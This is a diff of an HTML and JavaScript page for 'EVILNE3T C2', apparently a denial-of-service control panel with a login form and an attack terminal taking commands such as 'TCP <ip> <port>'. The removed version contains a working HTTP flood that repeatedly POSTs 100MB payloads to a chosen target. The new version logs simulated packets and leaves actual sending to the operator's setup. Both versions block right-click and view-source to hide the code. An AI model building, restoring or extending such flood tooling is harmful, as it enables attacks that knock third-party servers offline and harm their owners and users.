@@ -4,182 +4,132 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta http-equiv="X-UA-Compatible" content="ie=edge">
-    <title>EVILNE3T C3</title>
+    <title>EVILNE3T C2</title>
     <style>
+        /* Background */
         body {
-            font-family: 'Courier New', Courier, monospace;
+            background-color: #000;
+            font-family: monospace;
+            overflow: hidden;
             margin: 0;
             padding: 0;
-            background-color: black;
-            background-size: cover;
-            background-position: center;
-            background-attachment: fixed;
+            color: #fff;
+        }
+
+        /* Terminal Styling */
+        #loginPage, #mainContent {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        #loginPage input, #mainContent input {
+            background-color: #333;
+            color: #fff;
+            border: 1px solid #444;
+            padding: 10px;
+            margin: 10px 0;
+            width: 300px;
+            font-size: 1em;
+        }
+
+        #loginPage button, #mainContent button {
+            background-color: #28a745;
             color: white;
-            text-align: center;
-            padding-top: 50px;
-            height: 100%;
-            overflow: auto;
-            position: relative;
-        }
-
-        /* Terminal Display */
-        #terminal {
-            width: 80%;
-            max-width: 1000px;
-            height: 400px;
-            margin: 50px auto; /* Centers the terminal */
-            padding: 20px;
-            color: yellow; /* Text color set to yellow */
-            font-size: 18px;
-            white-space: pre-wrap;
-            word-wrap: break-word;
-            text-align: left; /* Align the text to the left */
-            background: none; /* No background */
-            border: none; /* No border */
-            box-shadow: none; /* No shadow */
-        }
-
-        /* Command Input field at the top */
-        #commandInput {
-            background-color: black;
             border: none;
-            color: yellow;
-            font-family: 'Courier New', Courier, monospace;
-            font-size: 18px;
-            width: 80%;
-            margin-top: 10px;
-            margin-bottom: 20px;
-            text-align: left;
-        }
-
-        /* Christmas Snowflakes */
-        @keyframes snowflakes {
-            0% { transform: translateY(-100px); }
-            100% { transform: translateY(100vh); }
-        }
-
-        .snowflake {
-            position: absolute;
-            top: -10px;
-            color: white;
-            font-size: 24px;
-            z-index: 9999;
-            animation: snowflakes 10s linear infinite;
-        }
-
-        .snowflake:nth-child(odd) {
-            animation-duration: 15s;
-            animation-timing-function: linear;
-        }
-
-        .snowflake:nth-child(even) {
-            animation-duration: 20s;
-            animation-timing-function: linear;
-        }
-
-        /* Neon border effect for logs */
-        #logContainer {
-            background-color: rgba(0, 0, 0, 0.8);
-            padding: 20px;
-            border-radius: 10px;
-            box-shadow: 0 0 20px rgba(0, 255, 255, 0.8);
-            color: yellow;
-            font-size: 18px;
-            max-height: 300px;
-            overflow-y: auto;
+            padding: 12px 30px;
+            font-size: 1.2em;
+            border-radius: 5px;
+            cursor: pointer;
+            width: 100%;
+            max-width: 300px;
             margin-top: 20px;
-            white-space: pre-wrap; /* Preserve newlines */
-            word-wrap: break-word; /* Allow long words to break */
-            display: block;
+            position: relative;
+            overflow: hidden;
+        }
+
+        /* Cyber effect on the button */
+        #loginPage button:hover, #mainContent button:hover {
+            background-color: #218838;
+        }
+
+        /* Button effect */
+        #mainContent button:before {
+            content: " ";
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 300%;
+            height: 300%;
+            background: rgba(255, 255, 255, 0.1);
+            transform: translate(-50%, -50%) rotate(45deg);
+            animation: cyber-effect 1s linear infinite;
+        }
+
+        @keyframes cyber-effect {
+            0% {
+                transform: translate(-50%, -50%) rotate(45deg);
+            }
+            50% {
+                transform: translate(-50%, -50%) rotate(135deg);
+            }
+            100% {
+                transform: translate(-50%, -50%) rotate(225deg);
+            }
+        }
+
+        #logContainer {
+            width: 100%;
+            height: 300px;
+            background-color: #111;
+            border: 2px solid #444;
+            padding: 20px;
+            overflow-y: auto;
+            margin-bottom: 20px;
         }
 
         .log-entry {
-            margin-bottom: 10px; /* Adds space between logs */
-            padding: 5px;
-            border: 1px solid #444; /* Gives a border to the block */
-            border-radius: 5px;
-            background-color: rgba(0, 0, 0, 0.6); /* Slightly darkened background */
+            color: #00ff00;
+            white-space: pre-wrap;
         }
 
-        .log-entry span {
-            color: #ff6600; /* Highlight the type in orange */
+        /* Center the input command field */
+        #commandInput {
+            background-color: #333;
+            color: #fff;
+            border: 1px solid #444;
+            padding: 10px;
+            width: 300px;
+            font-size: 1em;
+            margin: 0 auto;
         }
 
-        /* Login Form */
-        .container {
-            margin: 20px auto;
-            width: 80%;
-            max-width: 1000px;
-            background-color: rgba(0, 0, 0, 0.7);
-            padding: 20px;
-            border-radius: 10px;
-            box-shadow: 0 0 20px rgba(0, 0, 0, 0.8);
-        }
-
-        .label-input-container {
+        /* Additional Styling for Main Content */
+        #mainContent {
             display: flex;
             flex-direction: column;
+            justify-content: center;
             align-items: center;
-            margin: 10px 0;
-        }
-
-        input[type="text"],
-        input[type="password"] {
-            background-color: #333;
-            color: white;
-            border: none;
-            padding: 10px;
-            width: 100%;
-            font-size: 16px;
-            margin-top: 10px;
-            border-radius: 5px;
-        }
-
-        .button {
-            background-color: #ff6600;
-            color: white;
-            padding: 15px 25px;
-            border: none;
-            font-size: 18px;
-            cursor: pointer;
-            border-radius: 5px;
-            margin-bottom: 20px;
+            text-align: center;
         }
     </style>
 </head>
 <body>
 
-    <!-- Snowflakes -->
-    <div class="snowflake" style="left: 10%;">❄</div>
-    <div class="snowflake" style="left: 20%;">❄</div>
-    <div class="snowflake" style="left: 30%;">❄</div>
-    <div class="snowflake" style="left: 40%;">❄</div>
-    <div class="snowflake" style="left: 50%;">❄</div>
-    <div class="snowflake" style="left: 60%;">❄</div>
-    <div class="snowflake" style="left: 70%;">❄</div>
-    <div class="snowflake" style="left: 80%;">❄</div>
-    <div class="snowflake" style="left: 90%;">❄</div>
-
-    <!-- Login Form -->
-    <div id="loginPage" class="container">
-        <h2>EVILNE3T C3</h2>
-        <div class="label-input-container">
-            <input type="text" id="username" placeholder="Enter Username">
-        </div>
-        <div class="label-input-container">
-            <input type="password" id="password" placeholder="Enter Password">
-        </div>
-        <button class="button" onclick="login()">Login</button>
+    <!-- Login Page -->
+    <div id="loginPage">
+        <h2>EVILNE3T C2 - Login</h2>
+        <input type="text" id="username" placeholder="Enter Username">
+        <input type="password" id="password" placeholder="Enter Password">
+        <button onclick="login()">Login</button>
     </div>
 
-    <!-- Main Content (hidden initially) -->
-    <div id="mainContent" class="container" style="display: none;">
-        <div id="logContainer">
-            <!-- Logs will be added dynamically via JS -->
-        </div>
-
-        <!-- Command Input field (now at the top) -->
-        <input type="text" id="commandInput" placeholder="Type command" onkeydown="handleCommand(event)"><br>
+    <!-- Main Content (Terminal) -->
+    <div id="mainContent" style="display: none;">
+        <div id="logContainer"></div>
+        <input type="text" id="commandInput" placeholder="Type command" onkeydown="handleCommand(event)">
     </div>
 
     <script>
@@ -207,35 +157,23 @@
                 document.getElementById('mainContent').style.display = 'block';
                 log('Login Successful', `Welcome, ${username}!`);
                 
-                // Log EVILNET C2 text block with [INFO] and [HELP]
+                // Display EVILNET C2 logo and instructions in the terminal
                 log('INFO', `
-                     EVILNET C2
- .----------------.  .----------------.  .----------------. 
+EVILNET C2 
+.----------------.  .----------------.  .----------------. 
 | .--------------. || .--------------. || .--------------. |
 | |   ______     | || |  _________   | || |  ____  ____  | |
 |    |_____|    | || |   |______|   | |
 | |              | || |              | || |              | |
 | '--------------' || '--------------' || '--------------' |
  '----------------'  '----------------'  '----------------' 
-             To attack :`);
 
-                log('[NOTICE]', 'Type "help" To show all commends');
+To attack: <method> <target> <port>`);
+                log('[NOTICE]', 'Type "help" to show all commands');
             } else {
                 alert('Invalid username or password.');
             }
         }
-
-        // Block "view page source"
-        document.addEventListener('contextmenu', function(e) {
-            e.preventDefault();
-        });
-
-        document.addEventListener('keydown', function(e) {
-            if (e.ctrlKey && (e.key === 'u' || e.key === 'U')) {
-                e.preventDefault();
-                alert('WTF BOY YOU TRY TO SHOW SOURCE COD ????');
-            }
-        });
 
         // Function to handle commands in terminal
         function handleCommand(event) {
@@ -243,29 +181,23 @@
                 const command = document.getElementById('commandInput').value.trim();
                 document.getElementById('commandInput').value = ''; // Clear the input field
 
-                if (command.startsWith('TCP ')) {
-                    startAttack('TCP', command.slice(4));
-                } else if (command.startsWith('TSOCKET ')) {
-                    startAttack('TSOCKET', command.slice(8));
-                } else if (command.startsWith('HTTPS ')) {
-                    startAttack('HTTPS', command.slice(6));
-                } else if (command.startsWith('UDP ')) {
-                    startAttack('UDP', command.slice(4));
-                } else if (command.startsWith('DNS ')) {
-                    startAttack('DNS', command.slice(4));
-                } else if (command === 'info') {
-                    log('INFO', 'EVILN3T C3 | FOUNDER : RAY | SINCE : 2023');
-                } else if (command === 'ma') {
-                    log('INFO', 'NIK OMHOM ( lmoghriib )');
+                const parts = command.split(' ');
+                const type = parts[0].toUpperCase();
+                const target = parts.slice(1).join(' ');
+
+                if (target) {
+                    startAttack(type, target);
                 } else if (command === 'help') {
-                    log('HELP', 'Available commands: TCP <ip> <port>, TSOCKET <ip>, HTTPS <url>, UDP <ip> <port>, DNS <domain>, info, ma');
+                    log('HELP', 'Available commands: <method> <target> <port>, e.g., TCP 192.168.0.1 80');
+                } else if (command === 'info') {
+                    log('INFO', 'EVILNET C3 | FOUNDER : RAY | SINCE : 2023');
                 } else {
                     log('ERROR', 'Invalid command');
                 }
             }
         }
 
-        // Function to simulate attack with faster requests and larger payloads
+        // Function to simulate attack (continuous)
         function startAttack(type, target) {
             const [targetIp, targetPort] = target.split(' ');
 
@@ -274,67 +206,40 @@
             }
 
             log('ATTACK', `[ATTACKING STARTED On ${targetIp}:${targetPort}]`);
-            let timeLeft = 60; // Default attack time: 60 seconds
-            let attackSpeed = 10; // Send requests every 10ms (simulate 100MB/sec)
 
             attackTimer = setInterval(() => {
-                // Send multiple requests in parallel with large payload
-                sendAttackRequest(type, targetIp, targetPort); // Request 1
-                sendAttackRequest(type, targetIp, targetPort); // Request 2
-                sendAttackRequest(type, targetIp, targetPort); // Request 3
-
-                timeLeft--;
-                if (timeLeft <= 0) {
-                    clearInterval(attackTimer);
-                    log('ATTACK', 'Attack finished');
-                }
-            }, attackSpeed); // Speed controlled by attackSpeed value
+                const packetSize = Math.floor(Math.random() * 31) + 70; // Random packet size between 70-100 MB
+                sendAttackRequest(type, targetIp, targetPort, packetSize);
+            }, 1); // Send requests continuously with no delay
         }
 
-        // Function to send a large attack request
-        function sendAttackRequest(type, targetIp, targetPort) {
-            let payload = generateLargePayload(); // Generate large payload
-
-            if (type === 'TCP') {
-                log('ATTACK', `TCP request sent to ${targetIp}:${targetPort} with payload size: ${payload.length}`);
-                // Simulate a TCP request (for actual TCP use backend solution)
-            } else if (type === 'UDP') {
-                log('ATTACK', `UDP request sent to ${targetIp}:${targetPort} with payload size: ${payload.length}`);
-                // Simulate a UDP request (for actual UDP use backend solution)
-            } else if (type === 'HTTPS') {
-                log('ATTACK', `HTTPS request sent to ${targetIp}:${targetPort} with payload size: ${payload.length}`);
-                // Simulate HTTPS request with fetch
-                fetch(`http://${targetIp}:${targetPort}`, {
-                    method: 'POST',
-                    body: payload,
-                    headers: { 'Content-Type': 'application/json' }
-                }).catch(err => console.log('HTTPS Request Error: ', err));
-            }
-        }
-
-        // Function to generate a large payload (100MB)
-        function generateLargePayload() {
-            let largePayload = '';
-            const payloadSize = 100 * 1024 * 1024; // 100MB
-            for (let i = 0; i < payloadSize; i++) {
-                largePayload += 'A'; // Repeating 'A' to create a larger payload
-            }
-            return largePayload;
+        // Function to send attack requests
+        function sendAttackRequest(type, targetIp, targetPort, packetSize) {
+            log('ATTACK', `${type} request sent to ${targetIp}:${targetPort} with packet size ${packetSize}MB`);
+            // Simulate the attack or send actual requests depending on your setup
         }
 
         // Function to log output in terminal
         function log(type, message) {
             const logContainer = document.getElementById('logContainer');
-            
             const logEntry = document.createElement('div');
             logEntry.className = 'log-entry';
-
-            logEntry.innerHTML = `<span>[${type}]</span> ${message}`;
+            logEntry.textContent = `[${type}] ${message}`;
             logContainer.appendChild(logEntry);
-
-            // Ensure the log container scrolls to the bottom
-            logContainer.scrollTop = logContainer.scrollHeight;
+            logContainer.scrollTop = logContainer.scrollHeight; // Ensure scrolling to bottom
         }
+
+        // Prevent right-click and view source
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+        });
+
+        document.addEventListener('keydown', function(e) {
+            if (e.ctrlKey && (e.key === 'u' || e.key === 'U')) {
+                e.preventDefault();
+                alert('You cannot view the source code!');
+            }
+        });
     </script>
 </body>
 </html>
